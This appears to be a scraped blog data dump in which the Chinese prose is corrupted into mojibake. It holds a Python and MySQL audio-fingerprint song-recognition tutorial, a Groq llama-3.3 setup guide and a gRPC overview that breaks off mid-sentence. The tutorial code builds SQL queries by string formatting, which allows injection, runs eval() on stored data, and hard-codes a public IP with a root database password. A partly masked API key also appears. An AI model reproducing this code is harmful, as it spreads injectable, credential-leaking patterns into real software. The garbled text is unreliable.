ä½œä¸ºå£°çº¹æ•°æ®åº“ï¼Œè¿›è¡Œå£°çº¹ç‰¹å¾åŒ¹é…ï¼Œä»è€Œå®ç°æ­Œåè¯†åˆ«åœ¨Pythonè·å–åˆ°ç”¨æˆ·æ‰€éœ€å¯¹æ¯”è¯†åˆ«çš„çŸ­è§†é¢‘åï¼Œé€šè¿‡æå–å¯¹åº”å£°çº¹ç‰¹å¾ï¼Œä¸å£°çº¹æ•°æ®åº“ä¸­çš„å£°çº¹ç‰¹å¾è¿›è¡Œå¯¹æ¯”ï¼Œä»è€Œè·å–åˆ°å¯¹åº”çš„æ­Œæ›²åç§°ï¼Œå®ç°èƒŒæ™¯æ­Œåè¯†åˆ« æµç¨‹é…ç½®æ•°æ®åº“-&gt;å®‰è£…py-anacondaä¸‹è½½ç»„ä»¶-&gt;å…³è”æ•°æ®åº“å’Œpy-&gt;éªŒè¯ç»“æœ æ–°å»ºæ•°æ®åº“singdbutf8mb4 song_name varchar200fq longtext 12pip install pymysqlpip install -user moviepy -i http://pypi.douban.com/simple --trusted-host=pypi.douban.com è§†é¢‘è½¬éŸ³é¢‘1234from moviepy.editor importvideo=VideoFileClip(&#x27;ç¤ºä¾‹1.mp4&#x27;)audio = video.audioaudio.write audiofile(&#x27;ç¤ºä¾‹1.wav&#x27;) éªŒè¯ç»“æœ1234567sss=memory(&quot;å¼¹æ€§å…¬ç½‘IP&#x27;,3306,&#x27;root&quot;,&#x27;è‡ªè¡Œè®¾ç½®çš„å¯†ç â€™,&#x27;singdb&#x27;)res=sss.search and play(&#x27;ç¤ºä¾‹1.wav&#x27;)score=max(res)if score[0]&lt;1000:print(â€œæ²¡æœ‰æ‰¾åˆ°&quot;â€)else:print(&quot;æ­Œæ›²åç§°:&quot;,score[1]) é€šè¿‡Pythonçš„ç›¸å…³ä»£ç å¯¹çŸ­è§†é¢‘è¿›è¡Œè§†éŸ³åˆ†ç¦»å¹¶å»ºç«‹å£°éŸ³æŒ‡çº¹æ•°æ®åº“ï¼Œé€šè¿‡çŸ­è§†é¢‘èƒŒæ™¯éŸ³ä¹ä¸å£°å­¦æ¨¡å‹è¿›è¡ŒåŒ¹é…ï¼Œä»è€Œè·å–åˆ°èƒŒæ™¯æ­Œåã€‚ æ€»ç»“è¯­éŸ³å¤„ç†çš„åŸºç¡€çŸ¥è¯†åŠåº”ç”¨è¯­éŸ³å¤„ç†çš„åŸºæœ¬æ­¥éª¤ç†Ÿæ‚‰å£°çº¹è¯†åˆ«çš„éƒ¨ç½²æ–¹å¼åŠæ•´ä½“æµç¨‹ ä¹ é¢˜Pythonéœ€é€šè¿‡å¼¹æ€§å…¬ç½‘IPä¸äº‘æ•°æ®åº“RDSè¿›è¡Œè¿æ¥ã€‚tureå£°çº¹è¯†åˆ«ç¨³å®šæ€§ å¯æµ‹é‡æ€§ å”¯ä¸€æ€§ç‰¹å¾æå–å¯¹éŸ³é¢‘ä¿¡å·åšåˆ†å¸§å¤„ç†20~40mså¸§ testæ•°æ®åº“åç§°ï¼šsingdbï¼ˆå¯è‡ªå®šä¹‰ï¼‰å­—ç¬¦é›†ï¼šutf8mb4è¡¨åï¼šfingerprintï¼ˆå¯è‡ªå®šä¹‰ï¼‰å­˜å‚¨å¼•æ“ï¼šInnoDBå­—ç¬¦é›†ï¼šutf8mb4æ ¡éªŒè§„åˆ™ï¼šutf8mb4_general_ci Pycharmæå–éœ€å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ä¾›æ£€ç´¢è¯†åˆ«çš„éŸ³é¢‘æ–‡ä»¶çš„ç‰¹å¾ä¿¡æ¯ï¼ˆéŸ³é¢‘å¤„ç†çš„ç±»æœ‰ä¸‰ç§æ–¹æ³•ï¼šè½½å…¥æ•°æ®ã€å‚…é‡Œå¶å˜æ¢ã€æ’­æ”¾éŸ³ä¹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# coding=utf8import osimport reimport waveimport numpy as npimport pyaudioclass voice(): def loaddata(self, filepath): if type(filepath) != str: raise TypeError p1 = re.compile(&#x27;\\.wav&#x27;) if p1.findall(filepath) is None: raise IOError try: f = wave.open(filepath, &#x27;rb&#x27;) params = f.getparams() self.nchannels, self.sampwidth, self.framerate, self.nframes = params[:4] str_data = f.readframes(self.nframes) #self.wave_data = np.fromstring(str_data, dtype=np.short) self.wave_data = np.frombuffer(str_data, dtype=np.short) self.wave_data.shape = -1, self.sampwidth self.wave_data = self.wave_data.T f.close() self.name = os.path.basename(filepath) return True except: raise IOError def fft(self, frames=40): block = [] fft_blocks = [] self.high_point = [] blocks_size = self.framerate // frames blocks_num = self.nframes / blocks_size for i in range(0, len(self.wave_data[0]) - blocks_size, blocks_size): block.append(self.wave_data[0][i:i + blocks_size]) fft_blocks.append(np.abs(np.fft.fft(self.wave_data[0][i:i + blocks_size]))) self.high_point.append((np.argmax(fft_blocks[-1][:40]), np.argmax(fft_blocks[-1][40:80]) + 40, np.argmax(fft_blocks[-1][80:120]) + 80, np.argmax(fft_blocks[-1][120:180]) + 120, # np.argmax(fft_blocks[-1][180:300]) + 180, )) def play(self, filepath): chunk = 1024 wf = wave.open(filepath, &#x27;rb&#x27;) p = pyaudio.PyAudio() stream = p.open(format=p.get_format_from_width(wf.getsampwidth()), channels=wf.getnchannels(), rate=wf.getframerate(), output=True) while True: data = wf.readframes(chunk) if data == &quot;&quot;: break stream.write(data) stream.close() p.terminate()if __name__ == &#x27;__main__&#x27;: p = voice() p.loaddata(&quot;./music01.wav&quot;) # p.play(&#x27;temp/1.wav&#x27;)print(p.name) å°†æå–åˆ°çš„éŸ³é¢‘æ–‡ä»¶ç‰¹è´¨ç‰¹å¾å…³è”åˆ°æ–°å»ºæ•°æ®åº“é‡Œçš„æ•°æ®è¡¨ä¸­ï¼ˆå³å£°éŸ³æŒ‡çº¹æ•°æ®ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# coding=utf-8import pymysql as MySQLdbclass memory(): def __init__(self, host, port, user, passwd, db): self.host = host self.port = port self.user = user self.passwd = passwd self.db = db def addsong(self, path): if type(path) != str: raise TypeError # , &#x27;path need string&#x27; basename = os.path.basename(path) try: conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) except: print(&#x27;DataBase error&#x27;) return None cur = conn.cursor() namecount = cur.execute(&quot;select * from fingerprint WHERE song_name = &#x27;%s&#x27;&quot; % basename) if namecount &gt; 0: print(&#x27;the song has been record!&#x27;) return None v = voice() v.loaddata(path) v.fft() cur.execute(&quot;insert into fingerprint VALUES(&#x27;%s&#x27;,&#x27;%s&#x27;)&quot; % (basename, v.high_point.__str__())) conn.commit() print(&#x27;Added to database:%s&#x27; % (basename)) cur.close() conn.close() def fp_compare(self, search_fp, match_fp): if len(search_fp) &gt; len(match_fp): return 0 max_similar = 0 search_fp_len = len(search_fp) match_fp_len = len(match_fp) for i in range(match_fp_len - search_fp_len): temp = 0 for j in range(search_fp_len): if match_fp[i + j] == search_fp[j]: temp += 1 if temp &gt; max_similar: max_similar = temp return max_similar def search(self, path): v = voice() v.loaddata(path) v.fft() try: conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) except: raise IOError cur = conn.cursor() cur.execute(&quot;SELECT * FROM fingerprint&quot;) result = cur.fetchall() compare_res = [] for i in result: compare_res.append((self.fp_compare(v.high_point[:-1], eval(i[1])), i[0])) compare_res.sort(reverse=True) cur.close() conn.close() print(compare_res) return compare_res def search_and_play(self, path): v = voice() v.loaddata(path) v.fft() try: conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db, charset=&#x27;utf8&#x27;) except: print(&#x27;DataBase error&#x27;) return None cur = conn.cursor() cur.execute(&quot;SELECT * FROM fingerprint&quot;) result = cur.fetchall() compare_res = [] for i in result: compare_res.append((self.fp_compare(v.high_point[:-1], eval(i[1])), i[0])) compare_res.sort(reverse=True) cur.close() conn.close() print(compare_res) # v.play(compare_res[0][1]) return compare_res # sss.addsong(&#x27;taiyangzhaochangshengqi.wav&#x27;) # sss.addsong(&#x27;beiyiwangdeshiguang.wav&#x27;) # sss.addsong(&#x27;xiaozezhenger.wav&#x27;) # sss.addsong(&#x27;nverqing.wav&#x27;) # sss.addsong(&#x27;the_mess.wav&#x27;) # sss.addsong(&#x27;windmill.wav&#x27;) # sss.addsong(&#x27;end_of_world.wav&#x27;)sss = memory(&#x27;1.94.241.19&#x27;, 3306, &#x27;root&#x27;, &#x27;Huawei@2023&#x27;, &#x27;singdb&#x27;)sss.addsong(&#x27;./music01.wav&#x27;)sss.addsong(&#x27;./music02.wav&#x27;)sss.addsong(&#x27;./music03.wav&#x27;)sss.addsong(&#x27;./music04.wav&#x27;) æ­¤æ—¶å°†è·å–åˆ°çš„å£°éŸ³æŒ‡çº¹å­˜å‚¨åœ¨æ•°æ®åº“singdbçš„è¡¨fingerprintä¸­ï¼ˆæ³¨æ„ï¼šä»£ç ä¸­çš„å¼¹æ€§å…¬ç½‘IPã€ç«¯å£å·ã€rootå¯†ç è¦æ ¹æ®å®é™…é…ç½®çš„å†…å®¹è¿›è¡Œæ›´æ”¹ï¼‰ã€‚ æ•°æ®åº“æŸ¥è¯¢select 12345song_name fqmusic01.wav[(0, 73, 80, 132), (5, 76, 112, 135), (4, 52, 112, 135), (7, 76, 112, 135), (4, 74, 119, 135), (7, 76, 119, 135)... ] music02.wav[(0, 40, 80, 120), (6, 40, 98, 130), (3, 68, 88, 122), (5, 73, 93, 144), (3, 51, 92, 143), (3, 62, 92, 159)...] å¯¹æŠ–éŸ³çŸ­è§†é¢‘è¿›è¡Œå¤„ç†ï¼Œæå–å…¶ä¸­çš„éŸ³é¢‘ä¿¡æ¯ï¼ˆè¿™é‡ŒéŸ³é¢‘æ ¼å¼å¯ä»¥ä¸ºmp3ã€wavç­‰ï¼Œè¿™é‡Œå»ºè®®é€‰æ‹©wavæ ¼å¼ï¼‰ã€‚ 12345from moviepy.editor import *video = VideoFileClip(&#x27;example01.mp4&#x27;)audio = video.audioaudio.write_audiofile(&#x27;example01.wav&#x27;) æ‰§è¡Œä»£ç ï¼Œç»“æœæ˜¾ç¤ºï¼Œæ­¤æ—¶æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­å·²ç»ç”Ÿæˆå¯¹åº”çš„â€œexample01.wavâ€éŸ³é¢‘æ–‡ä»¶ã€‚ éªŒè¯ç»“æœ 1234567sss = memory(&#x27;EIP&#x27;, 3306, &#x27;root&#x27;, &#x27;Huawei@2023&#x27;, &#x27;singdb&#x27;)res = sss.search_and_play(&#x27;example01.wav&#x27;)score = max(res)if score[0]&lt;1000: print(&quot;Not Found&quot;)else: print(&quot;Song Name&quot;,score[1]) æ‰§è¡Œä»£ç ï¼Œç»“æœæ˜¾ç¤ºå·²ç»è¯†åˆ«å‡ºâ€œexample01â€éŸ³é¢‘çš„æ­Œæ›²åã€‚ç»“æœ 12[(1578, &#x27;music02.wav&#x27;), (0, &#x27;music04.wav&#x27;), (0, &#x27;music03.wav&#x27;), (0, &#x27;music01.wav&#x27;)]Song Name music02.wav test.py,ç‚¹å‡»Run â€˜testâ€™,æˆ–è€…å¿«æ·é”®ctrl+Shift+f10è¿è¡Œpythonæ–‡ä»¶ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"llama-3.3-70b-versatile","slug":"llama-3-3-70b-versatile","date":"2024-12-10T14:32:02.000Z","updated":"2024-12-10T14:33:06.834Z","comments":true,"path":"2024/12/10/llama-3-3-70b-versatile/","permalink":"https://banjinmei.github.io/2024/12/10/llama-3-3-70b-versatile/","excerpt":"","text":"llama-3.3-70b-versatileGroq API å…è´¹ä½¿ç”¨æ•™ç¨‹ç¬¬ä¸€æ­¥ï¼šè·å– API è®¿é—® https://console.groq.com/ å®Œæˆæ³¨å†Œå¹¶ç”³è¯· API -&gt; googlemail ä¿å­˜è·å¾—çš„ API å¯†é’¥ ç¬¬äºŒæ­¥ï¼šé…ç½® NextChat æ‰“å¼€ https://app.nextchat.dev/https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web åœ¨å·¦ä¾§è®¾ç½®ä¸­å¡«å…¥ï¼šè®¾ç½®-&gt;æ¨¡å‹æœåŠ¡å•†-&gt;Googleè®¾ç½®-&gt;è‡ªå®šä¹‰æ¥å£æ¨¡å‹(model) llama-3.3-70b-versatile æ¥å£åœ°å€ï¼šhttps://api.groq.com/openai/ API Keyï¼šå¡«å…¥ä¹‹å‰è·å–çš„å¯†é’¥ è‡ªå®šä¹‰æ¨¡å‹ï¼šllama-3.3-70b-versatile ä¸»è¦ä¼˜åŠ¿ å“åº”é€Ÿåº¦ï¼š200 Token&#x2F;ç§’ æ€§èƒ½è¡¨ç°ï¼šæ¥è¿‘ GPT-4.0 æ°´å¹³ å®Œå…¨å…è´¹ä½¿ç”¨ ä½¿ç”¨é™åˆ¶ æ¯åˆ†é’Ÿé™é¢ï¼š6000 Token æ¯æ—¥ API è°ƒç”¨ï¼š14000 æ¬¡ è¶³å¤Ÿæ™®é€šç”¨æˆ·æ—¥å¸¸ä½¿ç”¨ gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo 1æé—®ï¼šä½ æ˜¯ä»€ä¹ˆå¤§æ¨¡å‹ 12345678910111213å›ç­”ï¼šæˆ‘æ˜¯äººå·¥æ™ºèƒ½æ¨¡å‹ï¼Œç‰¹åˆ«æ˜¯ä¸€ç§å¤§å‹è¯­è¨€æ¨¡å‹ã€‚æˆ‘çš„ä¸»è¦åŠŸèƒ½æ˜¯ç†è§£å’Œç”Ÿæˆç±»ä¼¼äººç±»çš„æ–‡æœ¬ã€‚æˆ‘çš„è®­ç»ƒæ•°æ®åŒ…æ‹¬äº†å¤§é‡çš„æ–‡æœ¬ä¿¡æ¯ï¼Œè¿™ä½¿æˆ‘èƒ½å¤Ÿå­¦ä¹ è¯­è¨€çš„æ¨¡å¼å’Œç»“æ„ï¼Œå¹¶æ ¹æ®è¿™ä¸ªå­¦ä¹ ç”Ÿæˆç±»ä¼¼äººç±»çš„å›ç­”ã€‚æˆ‘çš„èƒ½åŠ›åŒ…æ‹¬ä½†ä¸é™äºï¼šå›ç­”é—®é¢˜ï¼šæˆ‘å¯ä»¥æ ¹æ®æˆ‘çš„è®­ç»ƒæ•°æ®å›ç­”å¹¿æ³›çš„é¢˜ç›®ï¼Œä»ç§‘å­¦å’Œå†å²åˆ°å¨±ä¹å’Œæ–‡åŒ–ã€‚ç”Ÿæˆæ–‡æœ¬ï¼šæˆ‘å¯ä»¥æ ¹æ®ç»™å®šçš„æç¤ºæˆ–ä¸»é¢˜ç”Ÿæˆæ–‡æœ¬ï¼ŒåŒ…æ‹¬æ–‡ç« ã€æ•…äº‹ã€è¯—æ­Œç­‰ã€‚ç¿»è¯‘ï¼šæˆ‘å¯ä»¥è¿›è¡Œè¯­è¨€ä¹‹é—´çš„ç¿»è¯‘ï¼Œä¾‹å¦‚ä»è‹±è¯­ç¿»è¯‘åˆ°è¥¿ç­ç‰™è¯­ã€æ³•è¯­ã€å¾·è¯­ç­‰ã€‚æ‘˜è¦ï¼šæˆ‘å¯ä»¥å°†é•¿ç¯‡æ–‡æœ¬æ‘˜è¦ä¸ºç®€çŸ­çš„æ‘˜è¦ï¼Œå¸®åŠ©ç”¨æˆ·å¿«é€Ÿç†è§£ä¸»è¦å†…å®¹ã€‚å¯¹è¯ï¼šæˆ‘å¯ä»¥ä¸ç”¨æˆ·è¿›è¡Œå¯¹è¯ï¼Œå›ç­”é—®é¢˜ï¼Œæä¾›ä¿¡æ¯ï¼Œç”šè‡³å‚ä¸è¾©è®ºã€‚æˆ‘çš„ä¼˜åŠ¿åœ¨äºèƒ½å¤Ÿå¿«é€Ÿå¤„ç†å’Œç”Ÿæˆå¤§é‡ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘çš„èƒ½åŠ›ä¹Ÿå—åˆ°è®­ç»ƒæ•°æ®çš„é™åˆ¶ã€‚å› æ­¤ï¼Œæˆ‘å¯èƒ½æ— æ³•æ€»æ˜¯æä¾›å®Œå…¨å‡†ç¡®æˆ–æœ€æ–°çš„ä¿¡æ¯ã€‚ç„¶è€Œï¼Œæˆ‘ä¼šå°½åŠ›æä¾›æœ€å¥½çš„ç­”æ¡ˆå’Œå¸®åŠ©ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://banjinmei.github.io/tags/AI/"},{"name":"llama","slug":"llama","permalink":"https://banjinmei.github.io/tags/llama/"}],"author":"mu"},{"title":"gRPC","slug":"gRPC","date":"2024-12-09T15:18:09.000Z","updated":"2024-12-09T15:37:12.296Z","comments":true,"path":"2024/12/09/gRPC/","permalink":"https://banjinmei.github.io/2024/12/09/gRPC/","excerpt":"","text":"gRPCï¼ˆGoogle Remote Procedure Callï¼‰æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ã€å¼€æºå’Œé€šç”¨çš„RPCæ¡†æ¶ï¼Œæœ€åˆç”±Googleå¼€å‘ã€‚å®ƒä½¿ç”¨HTTP&#x2F;2ä½œä¸ºä¼ è¾“åè®®ï¼Œå¹¶é»˜è®¤é‡‡ç”¨Protocol Buffersä½œä¸ºæ¥å£å®šä¹‰è¯­è¨€ï¼ˆIDLï¼‰å’Œæ¶ˆæ¯æ ¼å¼ã€‚gRPCæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºC++ã€Javaã€Pythonã€Goã€Rubyã€C#ã€Node.jsã€PHPç­‰ã€‚ gRPC ç‰¹ç‚¹ï¼šé«˜æ•ˆçš„æ•°æ®äº¤æ¢ï¼šé€šè¿‡ä½¿ç”¨Protocol Buffersï¼ˆProtobufï¼‰ï¼ŒgRPCèƒ½å¤Ÿä»¥äºŒè¿›åˆ¶å½¢å¼åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®ï¼Œè¿™æ¯”JSONæˆ–XMLç­‰æ–‡æœ¬æ ¼å¼æ›´ç´§å‡‘ã€æ›´å¿«ã€‚åŒå‘æµå¼é€šä¿¡ï¼šgRPCæ”¯æŒå››ç§ä¸åŒçš„è°ƒç”¨ç±»å‹ï¼šç®€å•RPCã€æœåŠ¡å™¨ç«¯æµå¼RPCã€å®¢æˆ·ç«¯æµå¼RPCä»¥åŠåŒå‘æµå¼RPCã€‚è¿™ä½¿å¾—å¼€å‘è€…å¯ä»¥çµæ´»é€‰æ‹©æœ€é€‚åˆå…¶åº”ç”¨åœºæ™¯çš„é€šä¿¡æ¨¡å¼ã€‚HTTP&#x2F;2ï¼šgRPCåŸºäºHTTP&#x2F;2æ„å»ºï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥åˆ©ç”¨HTTP&#x2F;2æä¾›çš„ç‰¹æ€§ï¼Œå¦‚å¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ã€æµé‡æ§åˆ¶ç­‰ï¼Œæ¥æé«˜æ€§èƒ½å’Œå¯é æ€§ã€‚è·¨å¹³å°æ”¯æŒï¼šgRPCå¯ä»¥åœ¨å¤šç§ç¯å¢ƒä¸­è¿è¡Œï¼ŒåŒ…æ‹¬äº‘æœåŠ¡ã€æœ¬åœ°éƒ¨ç½²ã€ç§»åŠ¨ç«¯ç­‰ï¼Œå¹¶ä¸”å¯¹å„ç§ç¼–ç¨‹è¯­è¨€éƒ½æœ‰è‰¯å¥½çš„æ”¯æŒï¼Œä¾¿äºæ„å»ºè·¨å¹³å°çš„åº”ç”¨ç¨‹åºã€‚æ’ä»¶ç³»ç»Ÿï¼šgRPCæä¾›äº†ä¸€ä¸ªæ’ä»¶ç³»ç»Ÿï¼Œå…è®¸ç”¨æˆ·è‡ªå®šä¹‰ä»£ç ç”Ÿæˆé€»è¾‘ï¼Œæˆ–è€…æ·»åŠ é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚è®¤è¯ã€æ—¥å¿—è®°å½•ã€ç›‘æ§ç­‰ã€‚å¼ºå¤§çš„ç¤¾åŒºå’Œç”Ÿæ€ç³»ç»Ÿï¼šç”±äºå®ƒæ˜¯Googleçš„äº§å“å¹¶ä¸”è¢«å¹¿æ³›é‡‡ç”¨ï¼Œå› æ­¤æ‹¥æœ‰ä¸€ä¸ªæ´»è·ƒçš„ç¤¾åŒºå’Œä¸°å¯Œçš„ç¬¬ä¸‰æ–¹åº“ä¸å·¥å…·ç”Ÿæ€ç³»ç»Ÿã€‚ gRPC åœºæ™¯ï¼šgRPCçš„ä½¿ç”¨åœºæ™¯éå¸¸å¹¿æ³›ï¼Œå°¤å…¶é€‚ç”¨äºéœ€è¦é«˜æ•ˆã€å¯é å’Œé«˜æ€§èƒ½é€šä¿¡çš„åº”ç”¨ç¨‹åºã€‚ä»¥ä¸‹æ˜¯gRPCçš„ä¸€äº›å…¸å‹ä½¿ç”¨åœºæ™¯ï¼š 1. å¾®æœåŠ¡æ¶æ„æœåŠ¡é—´é€šä¿¡ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œä¸åŒçš„æœåŠ¡å¯èƒ½ä½¿ç”¨ä¸åŒçš„ç¼–ç¨‹è¯­è¨€å®ç°ï¼Œå¹¶ä¸”éœ€è¦é«˜æ•ˆåœ°ç›¸äº’äº¤æµã€‚gRPCä»¥å…¶è·¨è¯­è¨€æ”¯æŒå’Œé«˜æ•ˆçš„äºŒè¿›åˆ¶åè®®ï¼ˆProtocol Buffersï¼‰ï¼Œæˆä¸ºæ„å»ºå¾®æœåŠ¡ä¹‹é—´é€šä¿¡å±‚çš„ç†æƒ³é€‰æ‹©ã€‚è´Ÿè½½å‡è¡¡ï¼šgRPCåŸç”Ÿæ”¯æŒå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ï¼Œå¯ä»¥å¸®åŠ©åˆ†æ•£è¯·æ±‚åˆ°å¤šä¸ªæœåŠ¡å®ä¾‹ä¸Šï¼Œæé«˜ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œæ€§èƒ½ã€‚ 2. å®æ—¶åº”ç”¨ç¨‹åºåŒå‘æµå¼é€šä¿¡ï¼šgRPCçš„åŒå‘æµç‰¹æ€§éå¸¸é€‚åˆç”¨äºå®æ—¶åº”ç”¨ç¨‹åºï¼Œå¦‚èŠå¤©åº”ç”¨ã€åœ¨çº¿æ¸¸æˆã€è§†é¢‘ä¼šè®®ç­‰ï¼Œå…¶ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éœ€è¦æŒç»­åœ°äº¤æ¢æ•°æ®ã€‚å®æ—¶æ•°æ®æ¨é€ï¼šå¯¹äºéœ€è¦ä»æœåŠ¡å™¨å‘å®¢æˆ·ç«¯æ¨é€å®æ—¶æ›´æ–°çš„åº”ç”¨ï¼Œä¾‹å¦‚è‚¡ç¥¨è¡Œæƒ…ã€ç¤¾äº¤åª’ä½“é€šçŸ¥ã€ç‰©è”ç½‘è®¾å¤‡çŠ¶æ€æ›´æ–°ç­‰ï¼ŒgRPCçš„æœåŠ¡ç«¯æµå¼RPCå¯ä»¥æœ‰æ•ˆåœ°å®ç°è¿™ä¸€éœ€æ±‚ã€‚ 3. ç§»åŠ¨åº”ç”¨ä¸åç«¯é€šä¿¡è½»é‡çº§æ€§èƒ½ï¼šç”±äºå…¶é«˜æ•ˆçš„åºåˆ—åŒ–æœºåˆ¶å’Œè¾ƒä½çš„ç½‘ç»œå¼€é”€ï¼ŒgRPCç‰¹åˆ«é€‚åˆç§»åŠ¨åº”ç”¨ä¸åç«¯æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œç‰¹åˆ«æ˜¯åœ¨ç½‘ç»œæ¡ä»¶ä¸ä½³çš„æƒ…å†µä¸‹ï¼Œèƒ½å¤Ÿå‡å°‘ç”µé‡æ¶ˆè€—å¹¶æé«˜å“åº”é€Ÿåº¦ã€‚å¿«é€Ÿå¼€å‘ï¼šgRPCè‡ªåŠ¨ç”Ÿæˆå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä»£ç çš„èƒ½åŠ›ï¼Œå¤§å¤§ç®€åŒ–äº†å¼€å‘æµç¨‹ï¼Œå°¤å…¶æ˜¯åœ¨å¤šå¹³å°å¼€å‘ç¯å¢ƒä¸­ï¼Œå‡å°‘äº†é‡å¤åŠ³åŠ¨ã€‚ 4. è·¨è¯­è¨€é€šä¿¡å¤šè¯­è¨€ç¯å¢ƒï¼šgRPCæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œä½¿å¾—å®ƒéå¸¸é€‚åˆç”¨äºè·¨è¯­è¨€é€šä¿¡çš„åœºæ™¯ã€‚ä¸åŒå›¢é˜Ÿæˆ–é¡¹ç›®å¯ä»¥ä½¿ç”¨å„è‡ªç†Ÿæ‚‰çš„æŠ€æœ¯æ ˆï¼ŒåŒæ—¶é€šè¿‡gRPCè¿›è¡Œæ— ç¼é›†æˆã€‚å¼‚æ„ç³»ç»Ÿé›†æˆï¼šå½“éœ€è¦å°†é—ç•™ç³»ç»Ÿä¸ç°ä»£åº”ç”¨é›†æˆæ—¶ï¼ŒgRPCçš„è·¨è¯­è¨€èƒ½åŠ›å¯ä»¥å¸®åŠ©æ¡¥æ¥è¿™äº›ç³»ç»Ÿï¼Œä¿ƒè¿›ä¿¡æ¯çš„æµåŠ¨å’Œäº¤äº’ã€‚ 5. åˆ†å¸ƒå¼ç³»ç»ŸèŠ‚ç‚¹é—´é€šä¿¡ï¼šåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå„èŠ‚ç‚¹ä¹‹é—´çš„é€šä¿¡æ˜¯è‡³å…³é‡è¦çš„ã€‚gRPCæä¾›çš„é«˜æ•ˆç‡å’Œå¯é æ€§ä½¿å…¶æˆä¸ºåˆ†å¸ƒå¼è®¡ç®—ã€ä»»åŠ¡åˆ†å‘ã€é›†ç¾¤ç®¡ç†ç­‰åœºæ™¯ä¸‹çš„é¦–é€‰é€šä¿¡æ¡†æ¶ã€‚æ•°æ®åŒæ­¥ï¼šgRPCå¯ä»¥ç”¨æ¥å®ç°å®æ—¶çš„æ•°æ®åŒæ­¥ï¼Œç¡®ä¿åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ‹¥æœ‰æœ€æ–°çš„æ•°æ®å‰¯æœ¬ã€‚ 6. å®¹å™¨åŒ–ç¯å¢ƒæœåŠ¡å‘ç°ï¼šåœ¨Kubernetesç­‰å®¹å™¨ç¼–æ’å¹³å°ä¸Šï¼ŒgRPCå¯ä»¥é€šè¿‡æœåŠ¡å‘ç°æœºåˆ¶è‡ªåŠ¨æ‰¾åˆ°å…¶ä»–æœåŠ¡ï¼Œç®€åŒ–äº†å®¹å™¨é—´çš„é€šä¿¡é…ç½®ã€‚è½»é‡çº§éƒ¨ç½²ï¼šgRPCçš„è½»é‡çº§ç‰¹æ€§å’Œå¯¹å¤šè¯­è¨€çš„æ”¯æŒï¼Œä½¿å…¶éå¸¸é€‚åˆå®¹å™¨åŒ–éƒ¨ç½²ï¼Œæœ‰åŠ©äºæå‡èµ„æºåˆ©ç”¨ç‡å’ŒæœåŠ¡æ‰©å±•æ€§ã€‚ 7. APIåç«¯æœåŠ¡é«˜æ€§èƒ½APIï¼šè®¸å¤šå¤§å‹äº’è”ç½‘å…¬å¸ä½¿ç”¨gRPCæ¥æ„å»ºå…¶APIåç«¯æœåŠ¡ï¼Œå› ä¸ºå®ƒæä¾›äº†é«˜æ€§èƒ½ã€å¯æ‰©å±•æ€§å’Œæ˜“äºç»´æŠ¤çš„æ–¹å¼æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ã€‚ç±»å‹å®‰å…¨ï¼šgRPCçš„IDLï¼ˆæ¥å£å®šä¹‰è¯­è¨€ï¼‰å®šä¹‰äº†ä¸¥æ ¼çš„æœåŠ¡å¥‘çº¦ï¼Œä¿è¯äº†æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„è°ƒç”¨æ˜¯ç±»å‹å®‰å…¨çš„ï¼Œå‡å°‘äº†è¿è¡Œæ—¶é”™è¯¯çš„å‘ç”Ÿã€‚ 8. ç‰©è”ç½‘ï¼ˆIoTï¼‰ä½èµ„æºæ¶ˆè€—ï¼šgRPCçš„é«˜æ•ˆæ€§èƒ½å’Œç´§å‡‘çš„æ¶ˆæ¯æ ¼å¼ï¼Œä½¿å¾—å®ƒæˆä¸ºè¿æ¥IoTè®¾å¤‡å’Œä¼ æ„Ÿå™¨çš„ç†æƒ³é€šä¿¡åè®®ï¼Œèƒ½å¤Ÿåœ¨æœ‰é™çš„è®¡ç®—å’Œç½‘ç»œèµ„æºä¸‹æä¾›å¯é 